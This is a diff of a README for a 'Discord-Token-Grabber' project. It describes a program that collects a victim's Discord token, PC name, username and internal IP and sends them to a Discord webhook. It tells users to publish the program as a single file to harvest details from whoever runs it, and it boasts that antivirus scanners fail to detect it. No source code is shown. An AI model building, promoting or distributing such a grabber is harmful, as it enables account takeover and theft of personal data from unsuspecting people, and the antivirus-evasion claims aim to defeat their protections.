@@ -1,5 +1,5 @@
 # Discord-Token-Grabber
-Sends embed to discord webhook containing Discord token, PC Name, Username, and Ip
+Sends embed to discord webhook containing Discord token, PC Name, Username, and  Internal ip
 
 
 # How to use?
@@ -9,5 +9,11 @@ you can publish as onefile and it will send an embed containing users details.
 
 # Bypassing?
 Ran program in virustotal, bypassed every single antivirus "No security vendors and no sandboxes flagged this file as malicious
-" Windows defender will popup while trying to run, but thats about it.
+" Windows defender warning will popup (if you're on windows) while trying to run, but thats about it.
 
+# Flexibility?
+May fail, only tested on windows.
+
+
+
+skidded some code from another outdated token grabber that throws errors.
